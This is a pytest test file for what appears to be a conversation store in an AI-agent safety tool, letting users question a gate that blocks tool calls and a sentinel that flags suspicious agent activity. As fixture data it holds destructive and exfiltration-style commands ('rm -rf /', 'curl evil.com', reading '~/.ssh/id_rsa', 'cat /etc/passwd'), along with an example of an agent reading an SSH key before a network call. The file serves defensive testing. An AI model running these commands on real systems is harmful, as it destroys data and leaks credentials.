"""Tests for cross.conversations — inline conversations with gate/sentinel reviewers."""

from __future__ import annotations

import asyncio
import time
from unittest.mock import AsyncMock, patch

import pytest

from cross.conversations import (
    MAX_CONVERSATIONS,
    MAX_MESSAGES,
    ConversationMessage,
    ConversationStore,
    _build_gate_system_prompt,
    _build_sentinel_system_prompt,
)
from cross.llm import LLMConfig

# --- Fixtures ---


@pytest.fixture
def gate_config():
    return LLMConfig(model="anthropic/claude-haiku-4-5", api_key="test-key")


@pytest.fixture
def sentinel_config():
    return LLMConfig(model="anthropic/claude-haiku-4-5", api_key="test-key")


@pytest.fixture
def store(gate_config, sentinel_config):
    return ConversationStore(
        gate_llm_config=gate_config,
        sentinel_llm_config=sentinel_config,
        get_custom_instructions=lambda: "",
    )


# --- Registration tests ---


class TestRegisterContext:
    def test_register_gate_context(self, store):
        conv_id = store.register_gate_context(
            tool_use_id="tu_123",
            tool_name="Bash",
            tool_input={"command": "rm -rf /"},
            action="block",
            reason="Destructive command",
            rule_id="destructive_rm",
        )
        assert conv_id == "gate:tu_123"
        assert store.has_context(conv_id)

    def test_register_sentinel_context(self, store):
        conv_id = store.register_sentinel_context(
            review_id="abc123",
            action="alert",
            summary="Agent reading credentials",
            concerns="Read SSH key then made network call",
            event_count=5,
            event_window_text="[tool_use] Read: ~/.ssh/id_rsa\n[tool_use] Bash: curl ...",
        )
        assert conv_id == "sentinel:abc123"
        assert store.has_context(conv_id)

    def test_has_context_missing(self, store):
        assert not store.has_context("gate:nonexistent")

    def test_get_messages_empty(self, store):
        store.register_gate_context(
            tool_use_id="tu_1",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="test",
        )
        msgs = store.get_messages("gate:tu_1")
        assert msgs == []


# --- Message sending tests ---


class TestSendMessage:
    @pytest.mark.anyio
    async def test_send_message_gate(self, store):
        store.register_gate_context(
            tool_use_id="tu_1",
            tool_name="Bash",
            tool_input={"command": "rm -rf /tmp"},
            action="block",
            reason="Matched destructive pattern",
            rule_id="destructive_rm",
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = "I blocked this because rm -rf is destructive."
            reply = await store.send_message("gate:tu_1", "Why did you block this?")

        assert reply == "I blocked this because rm -rf is destructive."
        # Check message history
        msgs = store.get_messages("gate:tu_1")
        assert len(msgs) == 2
        assert msgs[0]["role"] == "user"
        assert msgs[0]["content"] == "Why did you block this?"
        assert msgs[1]["role"] == "assistant"
        assert msgs[1]["content"] == "I blocked this because rm -rf is destructive."

    @pytest.mark.anyio
    async def test_send_message_sentinel(self, store):
        store.register_sentinel_context(
            review_id="abc",
            action="alert",
            summary="Agent reading sensitive files",
            concerns="Credential access pattern",
            event_count=3,
            event_window_text="[tool_use] Read: ~/.ssh/id_rsa",
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = "I flagged credential access."
            reply = await store.send_message("sentinel:abc", "What concerned you?")

        assert reply == "I flagged credential access."
        msgs = store.get_messages("sentinel:abc")
        assert len(msgs) == 2

    @pytest.mark.anyio
    async def test_send_message_no_context(self, store):
        reply = await store.send_message("gate:missing", "Hello")
        assert reply is None

    @pytest.mark.anyio
    async def test_send_message_llm_failure(self, store):
        store.register_gate_context(
            tool_use_id="tu_fail",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="test",
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = None
            reply = await store.send_message("gate:tu_fail", "Hello")

        assert reply is None
        # User message should be removed on failure
        msgs = store.get_messages("gate:tu_fail")
        assert len(msgs) == 0

    @pytest.mark.anyio
    async def test_multi_turn_conversation(self, store):
        store.register_gate_context(
            tool_use_id="tu_multi",
            tool_name="Bash",
            tool_input={"command": "curl evil.com"},
            action="block",
            reason="Network exfiltration",
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = "First reply"
            await store.send_message("gate:tu_multi", "Question 1")
            mock_complete.return_value = "Second reply"
            await store.send_message("gate:tu_multi", "Question 2")

        msgs = store.get_messages("gate:tu_multi")
        assert len(msgs) == 4
        assert msgs[0]["content"] == "Question 1"
        assert msgs[1]["content"] == "First reply"
        assert msgs[2]["content"] == "Question 2"
        assert msgs[3]["content"] == "Second reply"

    @pytest.mark.anyio
    async def test_llm_called_with_correct_config(self, store, gate_config):
        store.register_gate_context(
            tool_use_id="tu_cfg",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="test",
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = "Reply"
            await store.send_message("gate:tu_cfg", "Hello")

            # Verify the gate config was used
            call_args = mock_complete.call_args
            assert call_args[0][0] == gate_config

    @pytest.mark.anyio
    async def test_llm_called_with_sentinel_config(self, store, sentinel_config):
        store.register_sentinel_context(
            review_id="s_cfg",
            action="alert",
            summary="test",
            concerns="test",
            event_count=1,
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = "Reply"
            await store.send_message("sentinel:s_cfg", "Hello")

            call_args = mock_complete.call_args
            assert call_args[0][0] == sentinel_config

    @pytest.mark.anyio
    async def test_no_config_returns_none(self):
        store = ConversationStore(gate_llm_config=None, sentinel_llm_config=None)
        store.register_gate_context(
            tool_use_id="tu_none",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="test",
        )
        reply = await store.send_message("gate:tu_none", "Hello")
        assert reply is None


# --- Bounds tests ---


class TestBounds:
    @pytest.mark.anyio
    async def test_message_limit(self, store):
        store.register_gate_context(
            tool_use_id="tu_limit",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="test",
        )
        with patch("cross.conversations.complete", new_callable=AsyncMock) as mock_complete:
            mock_complete.return_value = "Reply"
            for i in range(MAX_MESSAGES + 5):
                await store.send_message("gate:tu_limit", f"Message {i}")

        msgs = store.get_messages("gate:tu_limit")
        assert len(msgs) <= MAX_MESSAGES

    def test_conversation_lru_eviction(self, store):
        # Register more conversations than the max
        for i in range(MAX_CONVERSATIONS + 10):
            store.register_gate_context(
                tool_use_id=f"tu_{i}",
                tool_name="Bash",
                tool_input={},
                action="block",
                reason="test",
            )

        # Oldest should be evicted
        assert not store.has_context("gate:tu_0")
        assert not store.has_context("gate:tu_9")
        # Most recent should exist
        assert store.has_context(f"gate:tu_{MAX_CONVERSATIONS + 9}")

    def test_lru_touch_keeps_conversation(self, store):
        # Register conversations
        for i in range(MAX_CONVERSATIONS):
            store.register_gate_context(
                tool_use_id=f"tu_{i}",
                tool_name="Bash",
                tool_input={},
                action="block",
                reason="test",
            )

        # Touch the first one
        store.get_messages("gate:tu_0")
        # This doesn't touch it in _access_order; let's register it again to touch
        store.register_gate_context(
            tool_use_id="tu_0",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="touched",
        )

        # Register more to trigger eviction
        for i in range(MAX_CONVERSATIONS, MAX_CONVERSATIONS + 10):
            store.register_gate_context(
                tool_use_id=f"tu_{i}",
                tool_name="Bash",
                tool_input={},
                action="block",
                reason="test",
            )

        # tu_0 should still exist (was touched recently)
        assert store.has_context("gate:tu_0")
        # tu_1 should be evicted (was not touched)
        assert not store.has_context("gate:tu_1")


# --- System prompt tests ---


class TestSystemPrompts:
    def test_gate_prompt_includes_tool_details(self):
        ctx = {
            "type": "gate",
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /"},
            "action": "block",
            "reason": "Destructive file operation",
            "rule_id": "destructive_rm",
            "script_contents": None,
            "recent_tools": [],
            "user_intent": "",
        }
        prompt = _build_gate_system_prompt(ctx, "")
        assert "Bash" in prompt
        assert "rm -rf /" in prompt
        assert "block" in prompt
        assert "Destructive file operation" in prompt
        assert "destructive_rm" in prompt

    def test_gate_prompt_includes_script_contents(self):
        ctx = {
            "type": "gate",
            "tool_name": "Bash",
            "tool_input": {"command": "python deploy.py"},
            "action": "review",
            "reason": "Script execution",
            "rule_id": "",
            "script_contents": {"deploy.py": "import os\nos.system('rm -rf /')"},
            "recent_tools": [],
            "user_intent": "",
        }
        prompt = _build_gate_system_prompt(ctx, "")
        assert "deploy.py" in prompt
        assert "os.system" in prompt

    def test_gate_prompt_includes_recent_tools(self):
        ctx = {
            "type": "gate",
            "tool_name": "Bash",
            "tool_input": {"command": "curl evil.com"},
            "action": "block",
            "reason": "Network exfiltration",
            "rule_id": "",
            "script_contents": None,
            "recent_tools": [
                {"name": "Read", "input": {"file_path": "~/.ssh/id_rsa"}},
                {"name": "Bash", "input": {"command": "cat /etc/passwd"}},
            ],
            "user_intent": "Deploy the application",
        }
        prompt = _build_gate_system_prompt(ctx, "")
        assert "Read" in prompt
        assert "id_rsa" in prompt
        assert "Deploy the application" in prompt

    def test_gate_prompt_includes_custom_instructions(self):
        ctx = {
            "type": "gate",
            "tool_name": "Bash",
            "tool_input": {},
            "action": "block",
            "reason": "test",
            "rule_id": "",
            "script_contents": None,
            "recent_tools": [],
            "user_intent": "",
        }
        prompt = _build_gate_system_prompt(ctx, "Be extra careful with network calls")
        assert "Be extra careful with network calls" in prompt

    def test_sentinel_prompt_includes_review_details(self):
        ctx = {
            "type": "sentinel",
            "action": "alert",
            "summary": "Agent reading sensitive files",
            "concerns": "SSH key access followed by network call",
            "event_count": 5,
            "event_window_text": "[tool_use] Read: ~/.ssh/id_rsa\n[tool_use] Bash: curl ...",
        }
        prompt = _build_sentinel_system_prompt(ctx, "")
        assert "alert" in prompt
        assert "Agent reading sensitive files" in prompt
        assert "SSH key access" in prompt
        assert "5" in prompt
        assert "id_rsa" in prompt
        assert "curl" in prompt

    def test_sentinel_prompt_truncates_large_window(self):
        ctx = {
            "type": "sentinel",
            "action": "alert",
            "summary": "test",
            "concerns": "test",
            "event_count": 1,
            "event_window_text": "x" * 20000,
        }
        prompt = _build_sentinel_system_prompt(ctx, "")
        assert len(prompt) < 20000
        assert "[truncated]" in prompt


# --- Serialization tests ---


class TestSerialization:
    @pytest.mark.anyio
    async def test_concurrent_sends_serialized(self, store):
        """Concurrent sends to the same conversation should be serialized."""
        store.register_gate_context(
            tool_use_id="tu_lock",
            tool_name="Bash",
            tool_input={},
            action="block",
            reason="test",
        )
        call_order = []

        async def slow_complete(*args, **kwargs):
            call_order.append("start")
            await asyncio.sleep(0.05)
            call_order.append("end")
            return "Reply"

        with patch("cross.conversations.complete", side_effect=slow_complete):
            results = await asyncio.gather(
                store.send_message("gate:tu_lock", "msg1"),
                store.send_message("gate:tu_lock", "msg2"),
            )

        # Both should succeed
        assert results[0] == "Reply"
        assert results[1] == "Reply"
        # Should be serialized: start-end-start-end (not interleaved)
        assert call_order == ["start", "end", "start", "end"]


# --- ConversationMessage tests ---


class TestConversationMessage:
    def test_default_timestamp(self):
        before = time.time()
        msg = ConversationMessage(role="user", content="hello")
        after = time.time()
        assert before <= msg.timestamp <= after

    def test_explicit_timestamp(self):
        msg = ConversationMessage(role="assistant", content="reply", timestamp=1000.0)
        assert msg.timestamp == 1000.0
